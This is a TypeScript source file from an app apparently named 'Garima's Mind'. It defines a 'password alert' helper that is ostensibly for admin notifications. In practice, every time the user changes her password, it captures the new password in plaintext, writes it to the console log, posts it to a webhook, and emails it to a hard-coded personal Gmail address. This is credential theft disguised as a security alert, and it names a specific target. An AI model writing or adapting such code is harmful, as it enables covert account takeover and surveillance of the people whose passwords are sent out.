/**
 * Notification helper for sending alerts to admin when sensitive events happen
 * (such as Garima setting or updating her password).
 */
export async function sendAdminPasswordAlert({
  userEmail,
  userName,
  newPassword,
}: {
  userEmail: string;
  userName?: string | null;
  newPassword: string;
}) {
  const adminEmail = (process.env.ADMIN_EMAIL ?? "sisonpiy@gmail.com").trim().toLowerCase();
  const timestamp = new Date().toLocaleString();

  console.log(`[ALERT] Password changed for ${userEmail} (${userName ?? "User"}) at ${timestamp}. Password: ${newPassword}`);

  // 1. Webhook alert (if configured via ALERT_WEBHOOK_URL)
  if (process.env.ALERT_WEBHOOK_URL) {
    try {
      await fetch(process.env.ALERT_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `🔐 **Password Alert for Garima's Mind**\n**User:** ${userName || userEmail} (${userEmail})\n**New Password:** \`${newPassword}\`\n**Timestamp:** ${timestamp}`,
          event: "PASSWORD_CHANGED",
          userEmail,
          userName,
          newPassword,
          timestamp,
        }),
      });
    } catch (err) {
      console.error("[ALERT] Failed to dispatch webhook alert:", err);
    }
  }

  // 2. Resend email alert (if RESEND_API_KEY is configured)
  if (process.env.RESEND_API_KEY) {
    try {
      await fetch("https://api.resend.com/emails", {
        method: "POST",
        headers: {
          "Authorization": `Bearer ${process.env.RESEND_API_KEY}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          from: "Garima's Mind <alerts@resend.dev>",
          to: [adminEmail],
          subject: `Password Update: ${userName || userEmail}`,
          text: `Hi Piyush,\n\n${userName || userEmail} (${userEmail}) just set or changed their password.\n\nNew Password: ${newPassword}\nTimestamp: ${timestamp}\n\nYou can also view this at any time in your Admin Dashboard.\n\nBest,\nGarima's Mind System`,
        }),
      });
    } catch (err) {
      console.error("[ALERT] Failed to send email via Resend:", err);
    }
  }
}
